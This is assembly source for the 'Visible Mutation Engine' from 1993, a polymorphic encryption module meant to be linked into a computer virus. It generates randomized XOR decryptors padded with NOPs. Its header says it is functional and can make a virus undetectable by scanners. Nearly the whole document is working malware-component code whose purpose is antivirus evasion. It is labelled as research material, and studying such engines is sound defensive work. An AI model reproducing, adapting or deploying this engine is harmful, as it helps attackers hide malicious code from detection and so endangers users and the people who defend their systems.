;The Visible Mutation Engine
;(C) 1993 American Eagle Publications, Inc. ALL RIGHTS RESERVED.

;WARNING: This is an actual, functional mutation engine. It can be attached to
;a virus and make it totally undetectable by scanners using current technology
;(March, 1993). It is intended for research and educational purposes only!

;The engine is an object module which can be linked into a virus, or any other
;software that needs to be self-encrypting.
;
;On calling the ENCRYPT routine,
;DS:SI points to where the code to encrypt is
;ES:DI points to where the decryption routine + encrypted code should be placed
;DX<>0 is the fixed size of the decryption routine.
;CX is the size of the unencrypted code
;BX is the starting offset of the decryption routine
;
;On return, carry will be set if there was an error which prevented the engine
;from generating the code. If successful, carry will be cleared.
;CX will be returned with the decryption routine + code size

                .model  tiny

                .code

                public  ENCRYPT

                extrn   RANDOM_SEED:near
                extrn   GET_RANDOM:near

CODE_LOC        DD      0                       ;area to save all passed parameters
ENCR_LOC        DD      0
DECR_SIZE       DW      0
DECR_OFFS       DW      0
CODE_SIZE       DW      0

ENCRYPT:
                cld
                push    bp                              ;preserve bp
                call    GET_LOC                         ;first figure out where we are
GET_LOC:        pop     bp
                sub     bp,OFFSET GET_LOC               ;offset stored in bp always
                push    ds
                mov     cs:[bp][DECR_OFFS],bx           ;save all calling parameters
                mov     bx,bp                           ;put base in bx
                mov     WORD PTR CS:[bx][CODE_LOC],si
                mov     WORD PTR CS:[bx][CODE_LOC+2],ds
                push    cs
                pop     ds
                mov     WORD PTR [bx][ENCR_LOC],di
                mov     WORD PTR [bx][ENCR_LOC+2],es
                mov     [bx][CODE_SIZE],cx
                mov     [bx][DECR_SIZE],dx
                call    RANDOM_SEED             ;seed random number generator
                call    SELECT_BASE             ;select decryptor base to use
                jc      ERR_EXIT                ;exit if error
                call    INIT_BASE               ;initialize decryptor
                jc      ERR_EXIT
                call    GENERATE_DECRYPT        ;create a decrypt routine in wkspace
                jc      ERR_EXIT
                call    ENCRYPT_CODE            ;encrypt the code as desired
                jc      ERR_EXIT                ;exit on error
                les     di,[bx][ENCR_LOC]       ;else set exit parameters
                mov     cx,[bx][CODE_SIZE]
                add     cx,[bx][DECR_SIZE]      ;cx=code+decr rtn size
ERR_EXIT:       pop     ds
                pop     bp
                ret

;******************************************************************************
;This routine selects which decryptor base to use. It simply gives each
;decryptor an even chance of being used. BASE_COUNT holds the total number
;of decryptor bases available to use, and BASE_NO is set by this function
;to the one that will be used from here on out. This routine also sets the
;size of the decryptor, if a fixed size is not specified. If a fixed size
;is specified, it checks to make sure enough room has been alotted. If not,
;it returns with carry set to indicate an error.
SELECT_BASE:
                call    GET_RANDOM              ;get a random number
                xor     dx,dx                   ;make it a dword
                mov     cx,[bx][BASE_COUNT]     ;get total number of base routines
                div     cx
                mov     [bx][BASE_NO],dx        ;save choice in BASE_NO
                mov     ax,[bx][DECR_SIZE]      ;ok, get requested size
                mov     si,dx                   ;get base number
                shl     si,1                    ;make an address out of it
                add     si,OFFSET BASE_SIZE_TBL
                mov     cx,[bx][si]             ;get selected base size
                or      ax,ax                   ;is base size 0?
                jz      SEL_SIZE1               ;yes, select a random size
                cmp     ax,cx                   ;is ax>=cx?
                retn                            ;return with carry set right

;If no base size selected, pick a random size between the minimum required
;size and the minimum + 127.
SEL_SIZE1:      call    GET_RANDOM
                and     ax,007FH
                add     ax,cx
                mov     [bx][DECR_SIZE],ax
                clc
                retn

;******************************************************************************
;This routine initializes the base routines for this round of encryption. It
;is responsible for inserting any starting/ending addresses into the base,
;and any random numbers that the base uses for encryption and decryption.
;It must insure that the encryptor and decryptor are set up the same way,
;so that they will work properly together. INIT_BASE itself is just a lookup
;function that jumps to the proper routine to work with the current base,
;as selected by SELECT_BASE. The functions in the lookup table perform all of
;the routine-specific chores.
INIT_BASE:
                mov     si,[bx][BASE_NO]
                shl     si,1                    ;determine encryptor to use
                add     si,OFFSET INIT_TABLE
                add     [bx][si],bx
                jmp     [bx][si]

INIT_TABLE      DW      OFFSET INIT_BASE0
                DW      OFFSET INIT_BASE1

;Initialize decryptor base number 0. This only has to set up the decryptor
;because the encryptor calls the decryptor.
INIT_BASE0:
                sub     [bx][si],bx             ;make sure to clean up INIT_TABLE!
                mov     si,D0START              ;set start address
                mov     ax,[bx][DECR_OFFS]
                add     ax,[bx][DECR_SIZE]
                mov     [bx][si],ax
                mov     si,D0SIZE               ;set size to decrypt
                mov     ax,[bx][CODE_SIZE]
                mov     [bx][si],ax
IB0TRYA:        call    GET_RANDOM
                or      ah,ah                   ;avoid triviality!!
                jz      IB0TRYA
                mov     si,D0RAND1              ;set up first random byte
                mov     [bx][si],al
                mov     si,D0RAND2              ;set up second random byte
                mov     [bx][si],ah
                clc
                retn                            ;that's it folks!

;Initialize decryptor base number 1. This only has to set up the decryptor
;because the encryptor calls the decryptor.
INIT_BASE1:
                sub     [bx][si],bx             ;make sure to clean up INIT_TABLE!
                mov     ax,[bx][DECR_OFFS]
                add     ax,[bx][DECR_SIZE]
                mov     si,D1START1             ;set start address 1
                mov     [bx][si],ax
                mov     si,D1START2             ;set start address 2
                mov     [bx][si],ax
                mov     si,D1SIZE               ;set size to decrypt
                mov     ax,[bx][CODE_SIZE]
                shr     ax,1                    ;use size / 2
                mov     [bx][si],ax
IB1TRYA:        call    GET_RANDOM
                or      ah,ah                   ;avoid triviality!!
                jz      IB1TRYA                 ;both bytes must be non-zero
                or      al,al
                jz      IB1TRYA
                mov     si,D1RAND               ;set up random word
                mov     [bx][si],ax
                clc
                retn                            ;that's it folks!


;******************************************************************************
;This routine encrypts the code using the desired encryption routine.
;On entry, es:di must point to where the encrypted code will go.
ENCRYPT_CODE:
                mov     si,[bx][BASE_NO]
                shl     si,1                    ;determine encryptor to use
                add     si,OFFSET ENCR_TABLE
                add     [bx][si],bx
                jmp     [bx][si]

ENCR_TABLE      DW      OFFSET ENCRYPT_CODE0
                DW      OFFSET ENCRYPT_CODE1

;Encryptor to go with decryptor base 0
ENCRYPT_CODE0:
                sub     [bx][si],bx             ;make sure to clean up ENCR_TABLE!
                push    ds                      ;may use a different ds below
                mov     cx,[bx][CODE_SIZE]
                lds     si,[bx][CODE_LOC]       ;ok, es:di and ds:si set up
                push    cx
                push    di
                rep     movsb                   ;move the code to work segment
                pop     si
                pop     cx
                push    es
                pop     ds
                call    ENCRYPT0                ;call encryptor
                pop     ds
                mov     bx,bp                   ;restore bx to code base
                clc                             ;return c reset for success
                retn

;Encryptor to go with decryptor base 1
ENCRYPT_CODE1:
                sub     [bx][si],bx             ;make sure to clean up ENCR_TABLE!
                push    ds                      ;may use a different ds below
                mov     cx,[bx][CODE_SIZE]
                lds     si,[bx][CODE_LOC]       ;ok, es:di and ds:si set up
                push    cx
                push    di
                rep     movsb                   ;move the code to work segment
                pop     di
                mov     si,di
                pop     dx
                push    es
                pop     ds
                call    ENCRYPT1                ;call encryptor
                pop     ds
                clc                             ;return c reset for success
                retn


;******************************************************************************
;The following routine generates a decrypt routine, and places it in memory
;at [ENCR_LOC]. This returns with es:di pointing to where encrypted code
;should go. It is assumed to have been setup properly by INIT_BASE. As with
;INIT_BASE, this routine performs a jump to the proper routine selected by
;BASE_NO, which then does all of the detailed work.
GENERATE_DECRYPT:
                mov     si,[bx][BASE_NO]
                shl     si,1                    ;determine encryptor to use
                add     si,OFFSET DECR_TABLE
                add     [bx][si],bx
                jmp     [bx][si]

DECR_TABLE      DW      OFFSET GEN_DECRYPT0
                DW      OFFSET GEN_DECRYPT1

;Generate the base routine 0.
GEN_DECRYPT0:
                sub     [bx][si],bx             ;make sure to clean up DECR_TABLE!
                mov     cx,OFFSET D0RET
                sub     cx,OFFSET DECRYPT0      ;cx=# of bytes in decryptor
                push    cx
                mov     si,OFFSET DECRYPT0      ;[bx][si] points to DECRYPT0
                add     si,bx                   ;si points to DECRYPT0
                les     di,[bx][ENCR_LOC]       ;es:di points to where to put it
                rep     movsb                   ;simply move it for now
                pop     ax
                mov     cx,[bx][DECR_SIZE]      ;get decryptor size
                sub     cx,ax                   ;need this many more bytes
                mov     al,90H                  ;NOP code in al
                rep     stosb                   ;put NOP's in
                clc                             ;return with c reset
                retn

;Generate the base routine 1.
GEN_DECRYPT1:
                sub     [bx][si],bx             ;make sure to clean up DECR_TABLE!
                mov     cx,OFFSET D1RET
                sub     cx,OFFSET DECRYPT1      ;cx=# of bytes in decryptor
                push    cx
                mov     si,OFFSET DECRYPT1      ;[bx][si] points to DECRYPT1
                add     si,bx                   ;si points to DECRYPT1
                les     di,[bx][ENCR_LOC]       ;es:di points to where to put it
                rep     movsb                   ;simply move it for now
                pop     ax
                mov     cx,[bx][DECR_SIZE]      ;get decryptor size
                sub     cx,ax                   ;need this many more bytes
                mov     al,90H                  ;NOP code in al
                rep     stosb                   ;put NOP's in
                clc                             ;return with c reset
                retn


;******************************************************************************
;Bases for Decrypt/Encrypt routines.

BASE_COUNT      DW      2               ;number of base routines available
BASE_NO         DW      0               ;base number in use
BASE_SIZE_TBL   DW      OFFSET D0RET - OFFSET DECRYPT0
                DW      OFFSET D1RET - OFFSET DECRYPT1

;This is the actual base routine 0. This is just a single-reference, varying
;byte-wise XOR routine.
DECRYPT0:
                mov     si,0                    ;mov si,OFFSET ENCRYPTED
                mov     cx,0                    ;mov cx,ENCRYPTED SIZE
ENCRYPT0:       mov     bl,0                    ;mov bl,RANDOM BYTE 1
D0LP:           xor     [si],bl
                inc     si
                add     bl,0                    ;add bl,RANDOM BYTE 2
                loop    D0LP
D0RET:          retn                            ;not used by decryptor!

;Defines to go with base routine 0
D0START         EQU     OFFSET DECRYPT0 + 1
D0SIZE          EQU     OFFSET DECRYPT0 + 4
D0RAND1         EQU     OFFSET DECRYPT0 + 7
D0RAND2         EQU     OFFSET DECRYPT0 + 13

;Here is the base routine 1. This is a double-reference, word-wise, fixed XOR
;encryptor.
DECRYPT1:
                mov     si,0
                mov     di,0
                mov     dx,0
ENCRYPT1:
D1LP:           mov     ax,[si]
                add     si,2
                xor     ax,0
                mov     ds:[di],ax
                add     di,2
                dec     dx
                jnz     D1LP
D1RET:          ret

;Defines to go with base routine 1
D1START1        EQU     OFFSET DECRYPT1 + 1
D1START2        EQU     OFFSET DECRYPT1 + 4
D1SIZE          EQU     OFFSET DECRYPT1 + 7
D1RAND          EQU     OFFSET DECRYPT1 + 15

                END

